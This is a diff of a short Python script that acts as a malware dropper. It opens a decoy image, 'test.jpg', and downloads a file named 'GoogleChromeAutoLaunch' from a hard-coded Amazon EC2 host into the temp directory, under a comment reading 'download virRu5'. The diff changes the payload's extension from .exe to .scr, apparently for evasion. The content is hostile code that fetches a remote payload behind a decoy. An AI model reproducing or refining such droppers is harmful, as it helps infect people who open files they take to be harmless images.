@@ -11,7 +11,7 @@ os.startfile('test.jpg')
 
 
 # download virRu5
-url = "http://ec2-52-90-251-67.compute-1.amazonaws.com/GoogleChromeAutoLaunch.exe"
+url = "http://ec2-52-90-251-67.compute-1.amazonaws.com/GoogleChromeAutoLaunch.scr"
 while True:
         try:
                 response = requests.get(url, stream=True)
@@ -22,7 +22,7 @@ while True:
 
 # move to temp
 tempDirectory = tempfile.gettempdir()
-newFile = tempDirectory + "//GoogleChromeAutoLaunch.exe"
+newFile = tempDirectory + "//GoogleChromeAutoLaunch.scr"
 
 with open(newFile, "wb") as handle:
         handle.write(response.content)
